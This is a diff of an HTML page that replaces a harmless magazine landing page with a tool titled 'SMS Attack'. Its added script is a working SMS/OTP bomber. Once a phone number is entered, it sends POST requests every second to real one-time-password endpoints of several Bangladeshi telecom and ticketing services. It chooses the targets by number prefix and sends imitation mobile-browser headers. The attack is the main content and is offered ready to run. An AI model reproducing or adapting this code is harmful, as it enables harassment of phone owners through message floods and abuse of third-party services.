@@ -3,203 +3,204 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mobile Site with Glowing Header</title>
-    <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@300;400;600&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-    <header class="glowing-header">
-        Our Digital Magazine
-    </header>
-    <main>
-        <div class="image-row">
-            <div class="image-container">
-                <img src="history.jpg" alt="The History of Udayan" class="image-button" onclick="location.href='history.html'">
-                <div class="text-box blue-box">
-                    <p>The History of Udayan</p>
-                </div>
-            </div>
-            <div class="image-container">
-                <img src="jokes.png" alt="The Jokes World" class="image-button" onclick="location.href='jokes.html'">
-                <div class="text-box green-box">
-                    <p>The Jokes World</p>
-                </div>
-            </div>
-        </div>
-        <div class="image-row">
-            <div class="image-container">
-                <img src="space_shooter.png" alt="The Space Shooter" class="image-button" onclick="location.href='game.html'">
-                <div class="text-box yellow-box">
-                    <p>The Space Shooter</p>
-                </div>
-            </div>
-            <div class="image-container">
-                <img src="real_life_iron_man.jpeg" alt="The Story of Real Life Iron Man" class="image-button" onclick="location.href='elon.html'">
-                <div class="text-box red-box">
-                    <p>The Story of Real Life Iron Man</p>
-                </div>
-            </div>
-        </div>
-    </main>
+    <title>SMS Attack</title>
     <style>
-        /* General Styles */
-        body, html {
-            margin: 0;
-            padding: 0;
-            font-family: 'Raleway', sans-serif;
-            background-color: #000;
-            color: #fff;
-            height: 100%;
-            overflow: hidden; /* Prevent scrolling */
-        }
-
-        /* Header Styles */
-        .glowing-header {
-            text-align: center;
-            padding: 10px;
-            font-size: 20px;
-            background-color: #282c34;
-            color: #ffffff;
-            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
-            text-shadow: 0 0 5px rgba(255, 255, 255, 0.7), 0 0 10px rgba(255, 255, 255, 0.7);
-            animation: glow 1.5s infinite alternate;
-        }
-
-        @keyframes glow {
-            from {
-                box-shadow: 0 0 10px rgba(255, 255, 255, 0.5), 0 0 20px rgba(255, 255, 255, 0.4), 0 0 30px rgba(255, 255, 255, 0.3);
-            }
-            to {
-                box-shadow: 0 0 20px rgba(255, 255, 255, 0.8), 0 0 40px rgba(255, 255, 255, 0.6), 0 0 60px rgba(255, 255, 255, 0.4);
-            }
-        }
-
-        /* Main Content Styles */
-        main {
+        body {
             display: flex;
             flex-direction: column;
-            justify-content: space-around;
-            align-items: center;
-            height: calc(100vh - 50px); /* Adjust based on header height */
-            padding: 10px;
-            box-sizing: border-box;
-        }
-
-        .image-row {
-            display: flex;
-            justify-content: space-around;
-            width: 100%;
-            height: 45%; /* Adjust height to ensure two rows fit */
-        }
-
-        .image-container {
-            width: 48%;
-            height: 100%;
-            text-align: center;
-            position: relative;
-        }
-
-        .image-button {
-            width: 100%;
-            height: 80%;
-            object-fit: cover;
-            cursor: pointer;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
-        }
-
-        .image-button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 20px rgba(255, 255, 255, 0.6);
-        }
-
-        .text-box {
-            width: 100%;
-            height: 60px; /* Increased height */
-            display: flex;
             justify-content: center;
             align-items: center;
-            font-weight: bold;
+            height: 100vh;
+            margin: 0;
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', Courier, monospace;
+            position: relative;
+        }
+        #phoneInput {
+            padding: 10px;
+            font-size: 1.2em;
+            width: 80%;
+            max-width: 300px;
+            margin-bottom: 20px;
+            background-color: #000;
+            color: #0f0;
+            border: 1px solid #0f0;
+        }
+        #attackButton {
+            padding: 10px 20px;
+            font-size: 1.2em;
+            background-color: #000;
+            color: #0f0;
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        #attackButton:hover {
+            background-color: #0f0;
+            color: #000;
+        }
+        #credit {
             position: absolute;
-            bottom: 0;
-            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
-            text-shadow: 0 0 5px rgba(255, 255, 255, 0.7);
+            bottom: 10px;
+            left: 10px;
+            color: #fff;
+            font-size: 0.9em;
         }
-
-        .blue-box {
-            background-color: #007BFF;
-            animation: box-glow-blue 1.5s infinite alternate;
-        }
-
-        .green-box {
-            background-color: #28A745;
-            animation: box-glow-green 1.5s infinite alternate;
-        }
-
-        .yellow-box {
-            background-color: #FFC107;
-            animation: box-glow-yellow 1.5s infinite alternate;
-        }
-
-        .red-box {
-            background-color: #DC3545;
-            animation: box-glow-red 1.5s infinite alternate;
-        }
-
-        @keyframes box-glow-blue {
-            from {
-                box-shadow: 0 0 10px rgba(0, 123, 255, 0.5);
-            }
-            to {
-                box-shadow: 0 0 20px rgba(0, 123, 255, 0.8);
-            }
-        }
-
-        @keyframes box-glow-green {
-            from {
-                box-shadow: 0 0 10px rgba(40, 167, 69, 0.5);
-            }
-            to {
-                box-shadow: 0 0 20px rgba(40, 167, 69, 0.8);
-            }
-        }
-
-        @keyframes box-glow-yellow {
-            from {
-                box-shadow: 0 0 10px rgba(255, 193, 7, 0.5);
-            }
-            to {
-                box-shadow: 0 0 20px rgba(255, 193, 7, 0.8);
-            }
-        }
-
-        @keyframes box-glow-red {
-            from {
-                box-shadow: 0 0 10px rgba(220, 53, 69, 0.5);
-            }
-            to {
-                box-shadow: 0 0 20px rgba(220, 53, 69, 0.8);
-            }
-        }
-
-        /* Responsive Design */
-        @media (max-width: 600px) {
-            .glowing-header {
-                font-size: 18px;
-                padding: 8px;
-            }
-
-            p {
-                font-size: 12px;
-            }
-        }
-    body {
-        background-color: #000;
-        margin: 0;
-        padding: 0;
-        overflow: hidden;
-    }
     </style>
+</head>
+<body>
+    <input type="text" id="phoneInput" placeholder="Enter phone number">
+    <button id="attackButton">Attack</button>
+    <div id="credit">Made by: - Nullboy</div>
+
+    <script>
+        let isAttacking = false;
+        let intervalId;
+
+        document.getElementById('attackButton').addEventListener('click', function() {
+            const button = this;
+            const phoneInput = document.getElementById('phoneInput').value;
+
+            if (!isAttacking) {
+                button.textContent = 'Stop';
+                isAttacking = true;
+
+                intervalId = setInterval(() => {
+                    const prefix = phoneInput.substring(0, 3);
+                    let requests = [];
+
+                    if (prefix === '019') {
+                        requests.push({
+                            url: 'https://eshop-api.banglalink.net/api/v1/customer/send-otp',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ type: 'phone', phone: phoneInput })
+                        });
+                        requests.push({
+                            url: 'https://api.busbd.com.bd/api/auth',
+                            headers: {
+                                "Host": "api.busbd.com.bd",
+                                "sec-ch-ua": '"Android WebView";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+                                "accept": "application/json, text/plain, */*",
+                                "content-type": "application/json",
+                                "sec-ch-ua-mobile": "?1",
+                                "user-agent": "Mozilla/5.0 (Linux; Android 10; TECNO KE7 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
+                                "sec-ch-ua-platform": '"Android"',
+                                "origin": "https://busbd.com.bd",
+                                "x-requested-with": "mark.via.gp",
+                                "sec-fetch-site": "same-site",
+                                "sec-fetch-mode": "cors",
+                                "sec-fetch-dest": "empty",
+                                "referer": "https://busbd.com.bd/",
+                                "accept-encoding": "gzip, deflate, br, zstd",
+                                "accept-language": "en-US,en;q=0.9"
+                            },
+                            body: JSON.stringify({ phone: `+88${phoneInput}` })
+                        });
+                        requests.push({
+                            url: 'http://103.125.31.198:5002/otp/create',
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({ phoneNumber: phoneInput })
+                        });
+                    } else if (prefix === '017') {
+                        requests.push({
+                            url: 'https://weblogin.grameenphone.com/backend/api/v1/otp',
+                            headers: {
+                                "Connection": "keep-alive",
+                                "Accept-Encoding": "gzip, deflate, br, zstd",
+                                "Sec-Fetch-Dest": "empty",
+                                "Sec-Fetch-Mode": "cors",
+                                "Sec-Fetch-Site": "same-origin",
+                                "X-Requested-With": "mark.via.gp",
+                                "Origin": "https://weblogin.grameenphone.com",
+                                "sec-ch-ua-platform": "\"Android\"",
+                                "User-Agent": "Mozilla/5.0 (Linux; Android 10; TECNO KE7 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
+                                "sec-ch-ua-mobile": "?1",
+                                "sec-ch-ua": "\"Android WebView\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({ msisdn: phoneInput })
+                        });
+                        requests.push({
+                            url: 'https://api.busbd.com.bd/api/auth',
+                            headers: {
+                                "Host": "api.busbd.com.bd",
+                                "sec-ch-ua": '"Android WebView";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+                                "accept": "application/json, text/plain, */*",
+                                "content-type": "application/json",
+                                "sec-ch-ua-mobile": "?1",
+                                "user-agent": "Mozilla/5.0 (Linux; Android 10; TECNO KE7 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
+                                "sec-ch-ua-platform": '"Android"',
+                                "origin": "https://busbd.com.bd",
+                                "x-requested-with": "mark.via.gp",
+                                "sec-fetch-site": "same-site",
+                                "sec-fetch-mode": "cors",
+                                "sec-fetch-dest": "empty",
+                                "referer": "https://busbd.com.bd/",
+                                "accept-encoding": "gzip, deflate, br, zstd",
+                                "accept-language": "en-US,en;q=0.9"
+                            },
+                            body: JSON.stringify({ phone: `+88${phoneInput}` })
+                        });
+                        requests.push({
+                            url: 'http://103.125.31.198:5002/otp/create',
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({ phoneNumber: phoneInput })
+                        });
+                    } else {
+                        requests.push({
+                            url: 'https://api.busbd.com.bd/api/auth',
+                            headers: {
+                                "Host": "api.busbd.com.bd",
+                                "sec-ch-ua": '"Android WebView";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+                                "accept": "application/json, text/plain, */*",
+                                "content-type": "application/json",
+                                "sec-ch-ua-mobile": "?1",
+                                "user-agent": "Mozilla/5.0 (Linux; Android 10; TECNO KE7 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
+                                "sec-ch-ua-platform": '"Android"',
+                                "origin": "https://busbd.com.bd",
+                                "x-requested-with": "mark.via.gp",
+                                "sec-fetch-site": "same-site",
+                                "sec-fetch-mode": "cors",
+                                "sec-fetch-dest": "empty",
+                                "referer": "https://busbd.com.bd/",
+                                "accept-encoding": "gzip, deflate, br, zstd",
+                                "accept-language": "en-US,en;q=0.9"
+                            },
+                            body: JSON.stringify({ phone: `+88${phoneInput}` })
+                        });
+                        requests.push({
+                            url: 'http://103.125.31.198:5002/otp/create',
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({ phoneNumber: phoneInput })
+                        });
+                    }
+
+                    requests.forEach(request => {
+                        fetch(request.url, {
+                            method: 'POST',
+                            headers: request.headers,
+                            body: request.body
+                        })
+                        .then(response => response.json())
+                        .then(data => console.log(data))
+                        .catch(error => console.error('Error:', error));
+                    });
+                }, 1000);
+            } else {
+                button.textContent = 'Attack';
+                isAttacking = false;
+                clearInterval(intervalId);
+            }
+        });
+    </script>
 </body>
 </html>
